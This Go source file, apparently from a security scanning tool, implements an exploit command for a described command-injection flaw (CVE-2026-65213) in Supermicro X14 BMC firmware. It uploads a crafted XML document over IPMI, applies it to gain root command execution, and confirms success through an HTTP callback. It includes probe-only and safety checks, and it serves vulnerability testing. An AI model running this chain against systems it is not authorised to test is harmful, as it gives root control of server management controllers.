package cmd

// CVE-2026-65213: the X14 (OpenBMC) OEM out-of-band file-apply handler
// RestorePSOOBBFile passes an uploaded XML document's Networking/MacAddr "value"
// attribute to the MAC-setting routine unvalidated, and that routine appends it
// to "/sbin/fw_setenv macaddr <value>" (and ethaddr) and runs it through popen
// as root. `smc-x14-cmdinj` drives the whole chain and confirms execution out of band.
//
// The safety contract is the reason the payload is not simply `$(id)`:
// fw_setenv does not validate macaddr/ethaddr, so whatever the substitution
// evaluates to is written to the U-Boot environment and persists across a
// reboot. The payload always echoes back a valid MAC - resolved from --mac or
// from the target over IPMI - and never an empty or captured-invalid value.

import (
	"context"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// smcX14MarkerDefault is the marker path used when --marker is not given.
const smcX14MarkerDefault = ipmi.SMCX14MarkerDefault

// smc0021Report is the rendered result of the CVE-2026-65213 workflow.
type smc0021Report struct {
	Finding    string `json:"finding"`
	Host       string `json:"host"`
	Port       int    `json:"port"`
	Generation string `json:"smcGeneration,omitempty"`
	Model      string `json:"smcModel,omitempty"`
	Firmware   string `json:"firmware,omitempty"`

	Primitive     string `json:"primitive"`
	ProbeOnly     bool   `json:"probeOnly,omitempty"`
	Probe         string `json:"probeResult,omitempty"`
	ReservationID string `json:"reservationID,omitempty"`
	PayloadBytes  int    `json:"payloadBytes,omitempty"`
	PayloadPath   string `json:"payloadPath,omitempty"`
	MAC           string `json:"mac,omitempty"`
	MACSource     string `json:"macSource,omitempty"`
	CallbackURL   string `json:"callbackURL,omitempty"`
	MarkerPath    string `json:"markerPath,omitempty"`
	Uploaded      bool   `json:"uploaded"`
	Applied       bool   `json:"applied"`
	ApplyReply    string `json:"applyReply,omitempty"`
	Action        string `json:"applyAction,omitempty"`
	ActionName    string `json:"applyActionName,omitempty"`

	Confirmed         bool   `json:"confirmed"`
	CallbackRemote    string `json:"callbackRemote,omitempty"`
	CallbackPath      string `json:"callbackPath,omitempty"`
	CallbackUserAgent string `json:"callbackUserAgent,omitempty"`

	Verdict string `json:"verdict"`
	Impact  string `json:"impact"`
	Note    string `json:"note,omitempty"`
}

func newSMC0021Report(host string) *smc0021Report {
	return &smc0021Report{
		Finding: "CVE-2026-65213",
		Host:    host,
		Port:    ipmiPort,
		Primitive: "RestorePSOOBBFile (NetFn 0x30 / Cmd 0xA0, apply action 0x05) " +
			"MacAddr XML attribute -> /sbin/fw_setenv macaddr/ethaddr via popen as root",
		Impact: "An authenticated IPMI Administrator executes arbitrary commands as the operating-system root user on the BMC. " +
			"Root execution is a total compromise of the BMC OS and is a boundary beyond the intended management role.",
	}
}

// runIPMISMC0021 drives the X14 RestorePSOOBBFile chain.
func runIPMISMC0021(ctx context.Context, sess *ipmi.CmdSess, _ []string) (any, error) {
	host := sess.Host()
	rep := newSMC0021Report(host)

	// Identify the target first: the handler exists only on X14. An unreadable
	// generation is not fatal, because the file chain itself answers whether the
	// dispatcher is present.
	if g, err := sess.SMCGeneration(ctx); err == nil && g != nil {
		rep.Generation, rep.Model = g.Generation, g.ModelPrefix
	}
	if fw, err := sess.SMCDeviceGeneration(ctx); err == nil {
		rep.Firmware = fw
	}
	if rep.Generation != "" && rep.Generation != ipmi.SMCX14FileChainGeneration {
		return rep, fmt.Errorf("generation %q (%s) does not carry the RestorePSOOBBFile handler: CVE-2026-65213 is specific to X14 (OpenBMC). The ATEN generations (X9 through X13, H13) ship a different 0x30/0xA0 dispatcher with no such action", rep.Generation, rep.Model)
	}

	xfer := ipmi.NewSMCConfigXfer(sess)
	applySMCChunk(xfer)

	if smcX14ProbeOnly {
		return smc0021Probe(ctx, xfer, rep)
	}

	// The injection always writes a valid MAC back to fw_setenv.
	mac, src, err := resolveSMC0021MAC(ctx, sess)
	if err != nil {
		return rep, err
	}
	rep.MAC, rep.MACSource = mac, src

	cb, err := startSMCCallback(host)
	if err != nil {
		return rep, err
	}
	defer cb.Close()

	marker := strings.TrimSpace(smcCmdInjMarker)
	if marker == "" {
		marker = smcX14MarkerDefault
	}
	rep.CallbackURL, rep.MarkerPath = cb.URL(), marker

	xml, err := ipmi.SMCX14PSOOBBXML(ipmi.SMCX14PSOOBBPayloadOptions{
		CallbackURL: cb.URL(),
		MarkerPath:  marker,
		KnownMAC:    mac,
	})
	if err != nil {
		return rep, err
	}
	rep.PayloadBytes = len(xml)
	rep.PayloadPath = writeSMCArtifact(host, "psoobb-inject.xml", xml)

	rid, err := xfer.Upload(ctx, xml)
	if err != nil {
		return rep, fmt.Errorf("uploading XML: %w", err)
	}
	rep.ReservationID = fmt.Sprintf("0x%04x", rid)
	rep.Uploaded = true

	if !smcApply {
		rep.Verdict = "staged (not applied)"
		rep.Note = "the document is uploaded but nothing is applied, so no command was injected. Pass --apply to dispatch the handler."
		return rep, nil
	}

	cc, aerr := xfer.Apply(ctx, rid, ipmi.SMCX14ActionRestorePSOOBB)
	rep.Applied = true
	rep.Action = fmt.Sprintf("0x%02x", ipmi.SMCX14ActionRestorePSOOBB)
	rep.ActionName = "RestorePSOOBBFile"
	if aerr != nil {
		// ApplyFileCommand dispatches into a detached thread; a missing reply is
		// not itself a failure, so it is reported and the callback still decides.
		rep.ApplyReply = fmt.Sprintf("no reply (the handler runs detached: %v)", aerr)
	} else {
		rep.ApplyReply = fmt.Sprintf("cc=0x%02x", cc)
	}

	if hit, ok := cb.Wait(smcCmdInjCallbackWait); ok {
		rep.Confirmed = true
		rep.CallbackRemote, rep.CallbackPath, rep.CallbackUserAgent = hit.RemoteAddr, hit.Path, hit.UserAgent
		rep.Verdict = "CONFIRMED: the injected command ran as root and called back"
		rep.Note = "the callback request is the proof, and its source address is the BMC. The marker file, when set, carries id(1) output on the target."
		return rep, nil
	}
	rep.Verdict = "NOT CONFIRMED: no callback arrived"
	rep.Note = fmt.Sprintf("no request reached the callback listener within %s. The apply reply is not an oracle (the handler is detached), so read the marker (%s) if the --marker path is reachable, confirm the BMC can route back to %s, and re-run if the upload or apply reported an error.", smcCmdInjCallbackWait, marker, cb.URL())
	return rep, nil
}

// smc0021Probe exercises the upload chain without applying anything, so an
// operator learns whether the handler is present before an injection is built.
func smc0021Probe(ctx context.Context, xfer *ipmi.SMCConfigXfer, rep *smc0021Report) (any, error) {
	rep.ProbeOnly = true
	// A real upload through the real sub-commands, with nothing for the handler
	// to act on because no apply follows.
	doc := []byte("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<IPMI><Networking><MacAddr value=\"00:00:00:00:00:00\"/></Networking></IPMI>\n")
	rid, err := xfer.Upload(ctx, doc)
	if err != nil {
		rep.Probe = "upload chain refused"
		rep.Verdict = "INCONCLUSIVE: the upload chain did not complete, so the handler's presence was not measured"
		rep.Note = err.Error()
		return rep, nil
	}
	rep.ReservationID = fmt.Sprintf("0x%04x", rid)
	rep.Uploaded = true
	rep.Probe = "reserve/start/upload accepted; apply withheld"
	rep.Verdict = "upload chain present (nothing applied; no command injected)"
	rep.Note = "the probe proves the 0x30/0xA0 file chain answers. Whether the RestorePSOOBBFile handler is reached is decided by the apply step, which --probe-only deliberately withholds."
	return rep, nil
}

// resolveSMC0021MAC returns the MAC the payload echoes back, and where it came
// from. Precedence: --mac, then the target's LAN configuration, then the PS OOB
// backup export. It fails rather than proceeding without a valid value, because
// an empty or wrong MAC is written to the U-Boot environment verbatim.
func resolveSMC0021MAC(ctx context.Context, sess *ipmi.CmdSess) (mac, source string, err error) {
	if m := strings.TrimSpace(smcX14MAC); m != "" {
		if !ipmi.ValidateSMCX14MAC(m) {
			return "", "", fmt.Errorf("--mac %q is not a valid xx:xx:xx:xx:xx:xx MAC", m)
		}
		return strings.ToLower(m), "--mac", nil
	}
	lanNote := "LAN config param 5 returned nothing usable"
	if m, gerr := sess.GetLANMAC(ctx); gerr == nil && m != "" {
		return m, "Get LAN Configuration Parameters param 5", nil
	} else if gerr != nil {
		lanNote = fmt.Sprintf("LAN config param 5 unavailable (%v)", gerr)
	}
	xfer := ipmi.NewSMCConfigXfer(sess)
	psxml, xerr := xfer.Export(ctx, 0x05)
	if xerr != nil {
		return "", "", fmt.Errorf("no valid MAC from --mac, LAN config, or the PS OOB backup export (%s; export: %v). Refusing to inject: fw_setenv writes the value verbatim, so a wrong or empty MAC persists in the U-Boot environment and can stop the BMC from booting", lanNote, xerr)
	}
	m, perr := ipmi.ParseX14PSOOBBMAC(psxml)
	if perr != nil {
		return "", "", fmt.Errorf("PS OOB backup export: %w", perr)
	}
	return m, "PS OOB backup export (type 0x05)", nil
}

// startSMCCallback binds the confirmation listener and picks the address the
// target should call back on.
func startSMCCallback(target string) (*ipmi.SMCCallbackServer, error) {
	addr := strings.TrimSpace(smcCmdInjCallbackAddr)
	if addr == "" {
		addr = "0.0.0.0"
	}
	port := smcCmdInjCallbackPort
	advertise := strings.TrimSpace(smcCmdInjCallbackHost)
	if advertise == "" {
		// Assume the local end of the route to the target. Right for a directly
		// attached network, best effort otherwise: a routed or NATed target needs
		// --callback-host.
		advertise = ipmi.SMCAdvertisedHostForTarget(target, port)
	}
	cb, err := ipmi.StartSMCCallbackServer(fmt.Sprintf("%s:%d", addr, port), advertise, smcRandomToken())
	if err != nil {
		return nil, fmt.Errorf("callback listener: %w", err)
	}
	return cb, nil
}

// writeSMCArtifact saves a generated payload under the per-host output directory
// so the exact bytes are auditable after the run. A write failure is not fatal:
// the caller reports an empty path and the run continues.
func writeSMCArtifact(host, name string, data []byte) string {
	dir := filepath.Join("smc-cmdinj-" + sanitizeHostForFile(host))
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return ""
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, data, 0o600); err != nil {
		return ""
	}
	return p
}

// smcRandomToken returns a random path element for the callback URL, so a request
// to the same port from anything other than the target is not mistaken for the
// confirmation. An empty token means every request to the listener counts.
func smcRandomToken() string {
	const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
	var buf [12]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return ""
	}
	out := make([]byte, len(buf))
	for i, c := range buf {
		out[i] = alphabet[int(c)%len(alphabet)]
	}
	return string(out)
}

// SMCPrintTable renders the report through the shared session-backed path, so
// `smc-x14-cmdinj` honors --format and prints a table by default like every other
// smc-* command.
func (r *smc0021Report) SMCPrintTable(w io.Writer) error { return printSMC0021Table(w, r) }

func printSMC0021Table(w interface{ Write([]byte) (int, error) }, r *smc0021Report) error {
	fmt.Fprintf(w, "HOST=%s PORT=%d FINDING=%s\n", r.Host, r.Port, r.Finding)
	if r.Generation != "" || r.Firmware != "" {
		fmt.Fprintf(w, "TARGET: generation=%s model=%s firmware=%s\n", orNone(r.Generation), orNone(r.Model), orNone(r.Firmware))
	}
	fmt.Fprintf(w, "PRIMITIVE: %s\n", r.Primitive)
	if r.ProbeOnly {
		fmt.Fprintf(w, "PROBE: %s\n", r.Probe)
		if r.ReservationID != "" {
			fmt.Fprintf(w, "  reservation           : %s\n", r.ReservationID)
		}
		fmt.Fprintf(w, "VERDICT: %s\n", r.Verdict)
		fmt.Fprintf(w, "NOTE: %s\n", r.Note)
		return nil
	}
	rows := [][]string{
		{"current MAC (echoed back)", orNone(r.MAC), orNone(r.MACSource)},
		{"callback URL in payload", orNone(r.CallbackURL), "the payload fetches this; the request is the proof"},
		{"marker path in payload", orNone(r.MarkerPath), "written with id(1) output; not read back by this run"},
		{"payload", fmt.Sprintf("%d bytes", r.PayloadBytes), r.PayloadPath},
		{"reservation ID", orNone(r.ReservationID), ""},
		{"apply action", orNone(r.Action), r.ActionName},
		{"apply reply", orNone(r.ApplyReply), "detached thread: a missing reply is not a failure"},
	}
	if err := writeASCIITable(w, []string{"Item", "Value", "Note"}, rows); err != nil {
		return err
	}
	if r.Confirmed {
		fmt.Fprintf(w, "CALLBACK: received from %s path=%s ua=%s\n", r.CallbackRemote, r.CallbackPath, orNone(r.CallbackUserAgent))
	}
	fmt.Fprintf(w, "VERDICT: %s\n", r.Verdict)
	fmt.Fprintf(w, "IMPACT: %s\n", r.Impact)
	if r.Note != "" {
		fmt.Fprintf(w, "NOTE: %s\n", r.Note)
	}
	return nil
}
